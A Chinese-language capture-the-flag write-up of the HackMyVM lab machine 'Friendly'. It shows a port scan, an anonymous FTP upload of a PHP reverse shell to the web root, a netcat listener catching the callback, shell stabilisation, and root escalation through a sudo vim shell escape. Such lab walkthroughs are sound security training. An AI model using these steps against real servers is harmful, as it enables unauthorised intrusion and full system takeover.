# hmv_friendly

# 0.简介

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Friendly  
**难度**：绿色  
**目标 IP**：192.168.205.129  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST
Nmap scan report for 192.168.205.129
Host is up (0.00059s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds

```

# 2.踩点

先进行ftp匿名登录

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.129
Connected to 192.168.205.129.
220 ProFTPD Server (friendly) [::ffff:192.168.205.129]
Name (192.168.205.129:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||17885|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html

```

和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问

```
ftp> put php.php 
local: php.php remote: php.php
229 Entering Extended Passive Mode (|||22559|)
150 Opening BINARY mode data connection for php.php
100% |*****************************************************************************************|  2596      255.89 KiB/s    00:00 ETA
226 Transfer complete
2596 bytes sent in 00:00 (241.58 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||7798|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
226 Transfer complete

```

访问

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 35158
Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 23:33:07 up 7 min,  0 users,  load average: 1.36, 6.63, 3.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (439): Inappropriate ioctl for device
bash: no job control in this shell

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
www-data@friendly:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Mar 11  2023 .
drwxr-xr-x  18 root root  4096 Mar 11  2023 ..
lrwxrwxrwx   1 root root     7 Feb 21  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Feb 21  2023 boot
drwxr-xr-x  17 root root  3140 Feb  2 23:26 dev
drwxr-xr-x  69 root root  4096 Feb  2 23:26 etc
drwxr-xr-x   3 root root  4096 Feb 21  2023 home
lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img -> boot/initrd.img-5.10.0-21-amd64
lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Feb 21  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 21  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 21  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 21  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Feb 21  2023 lost+found
drwxr-xr-x   3 root root  4096 Feb 21  2023 media
drwxr-xr-x   2 root root  4096 Feb 21  2023 mnt
drwxr-xr-x   2 root root  4096 Feb 21  2023 opt
dr-xr-xr-x 145 root root     0 Feb  2 23:26 proc
drwx------   3 root root  4096 Mar 11  2023 root
drwxr-xr-x  17 root root   540 Feb  2 23:26 run
lrwxrwxrwx   1 root root     8 Feb 21  2023 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Mar 11  2023 srv
dr-xr-xr-x  13 root root     0 Feb  2 23:26 sys
drwxrwxrwt   2 root root  4096 Feb  2 23:26 tmp
drwxr-xr-x  14 root root  4096 Feb 21  2023 usr
drwxr-xr-x  12 root root  4096 Feb 21  2023 var
lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz -> boot/vmlinuz-5.10.0-21-amd64
lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64
www-data@friendly:/$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim

```

![image](assets/image-20250203123641-1hov8b3.png)

🔗https://gtfobins.github.io/gtfobins/vim/#sudo

```
www-data@friendly:/$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)

```